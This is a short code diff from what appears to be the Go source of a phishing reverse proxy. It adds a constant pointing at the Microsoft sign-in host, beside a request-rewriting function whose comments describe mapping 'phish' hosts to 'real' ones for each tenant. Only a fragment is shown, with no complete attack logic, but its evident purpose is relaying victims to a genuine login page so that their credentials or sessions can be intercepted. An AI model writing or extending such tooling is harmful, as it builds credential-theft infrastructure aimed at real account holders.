@@ -17,6 +17,9 @@ import (
 //  REQUEST REWRITING (phish → real)
 // ══════════════════════════════════════════════════════════
 
+const defaultTerminateURL = "https://login.microsoftonline.com"
+
+
 func rewriteRequest(req *http.Request, originalHost, upstream string, target *Target, session *Session) {
 	// Resolve the tenant base domain from the propagated request context, then
 	// materialize this tenant's phish→real routing map.
